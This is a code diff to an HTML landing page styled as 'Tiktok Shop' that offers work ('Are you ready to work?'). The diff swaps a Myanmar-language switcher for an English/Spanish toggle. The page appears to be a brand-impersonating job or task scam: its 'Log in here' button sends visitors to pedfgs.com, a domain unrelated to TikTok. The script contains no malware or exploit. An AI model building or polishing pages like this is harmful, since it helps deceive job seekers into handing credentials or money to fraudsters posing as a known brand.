@@ -98,15 +98,65 @@
     </div>
 </div>
 
-<h5 style="cursor: pointer;">2 Cambiar al idioma de Myanmar</h5>
+<h5 style="cursor: pointer;">2 Cambiar al idioma de Inglés</h5>
 
 <script>
     var modal = document.getElementById("myModal");
     var span = document.getElementsByClassName("close")[0];
 
+    var originalText = {
+        title: "¡Bienvenidos a Tiktok Shop!",
+        subtitle: "¿Estás listo para trabajar?",
+        helpText: "¡Elige la ayuda que necesitas!",
+        loginLink: "1 Para volver a acceder a su cuenta",
+        modalMessage: "Una vez que haya completado su registro por primera vez, podrá iniciar sesión fácilmente en su cuenta utilizando este enlace.",
+        loginButton: "Iniciar sesión aquí",
+        changeLanguageText: "2 Cambiar al idioma de Inglés"
+    };
+
+    var englishText = {
+        title: "🎈🌼 Welcome to Tiktok Shop! 🌼🎈",
+        subtitle: "🛍️✨ Are you ready to work? ✨🛍️",
+        helpText: "🌈✨ Choose the help you need! ✨🌈",
+        loginLink: "1 Click here to log in to your account",
+        modalMessage: "Once you have completed your registration for the first time, you can easily log in to your account using this link.",
+        loginButton: "Log in here",
+        changeLanguageText: "2 Change to Spanish"
+    };
+
+    var isEnglish = false;
+
+    function changeLanguage() {
+        if (isEnglish) {
+            // Switch back to original language
+            document.querySelector("header h1").textContent = originalText.title;
+            document.querySelector("header h2").textContent = originalText.subtitle;
+            document.querySelector("header h3").textContent = originalText.helpText;
+            document.getElementById("login-link").textContent = originalText.loginLink;
+            document.getElementById("login-url").textContent = originalText.loginButton;
+            document.querySelector(".modal-content p").textContent = originalText.modalMessage;
+            document.querySelector("h5").textContent = originalText.changeLanguageText;
+        } else {
+            // Switch to English
+            document.querySelector("header h1").textContent = englishText.title;
+            document.querySelector("header h2").textContent = englishText.subtitle;
+            document.querySelector("header h3").textContent = englishText.helpText;
+            document.getElementById("login-link").textContent = englishText.loginLink;
+            document.getElementById("login-url").textContent = englishText.loginButton;
+            document.querySelector(".modal-content p").textContent = englishText.modalMessage;
+            document.querySelector("h5").textContent = englishText.changeLanguageText;
+        }
+
+        isEnglish = !isEnglish; // Toggle the language state
+    }
+
     document.getElementById("login-link").addEventListener('click', function() {
-        document.querySelector(".modal-content p").textContent = "Una vez que haya completado su registro por primera vez, podrá iniciar sesión fácilmente en su cuenta utilizando este enlace.";
-        document.getElementById("login-url").textContent = "Iniciar sesión aquí";
+        // Change to English when the login link is clicked
+        if (!isEnglish) {
+            changeLanguage();
+        }
+        document.querySelector(".modal-content p").textContent = englishText.modalMessage;
+        document.getElementById("login-url").textContent = englishText.loginButton;
         document.getElementById("login-url").href = "https://pedfgs.com/m/login";
         modal.style.display = "block";
     });
@@ -121,17 +171,7 @@
         }
     }
 
-    function changeLanguageToMyanmar() {
-        document.querySelector("header h1").textContent = "🎈🌼 Tiktok Shop မှ ကြိုဆိုပါတယ်! 🌼🎈";
-        document.querySelector("header h2").textContent = "🛍️✨ သင်အလုပ်လုပ်ရန် အသင့်ဖြစ်ပါသလား? ✨🛍️";
-        document.querySelector("header h3").textContent = "🌈✨ သင်လိုအပ်သောအကူအညီကို ရွေးချယ်ပါ! ✨🌈";
-        document.getElementById("login-link").textContent = "1 သင်၏အကောင့်သို့ ပြန်ဝင်ရန်";
-        document.getElementById("login-url").textContent = "ဒီမှာ ဝင်ပါ";
-        document.querySelector(".modal-content p").textContent = "သင်သည် ပထမဆုံးမှတ်ပုံတင်မှုကို အပြီးသတ်ပြီးပါက သင့်အကောင့်သို့ အလွယ်တကူ ဝင်ရောက်နိုင်ပါသည်။";
-        document.querySelector("h5").textContent = "2 မြန်မာဘာသာစကားသို့ပြောင်းပါ";
-    }
-
-    document.querySelector("h5").addEventListener('click', changeLanguageToMyanmar);
+    document.querySelector("h5").addEventListener('click', changeLanguage);
 </script>
 
 </body>
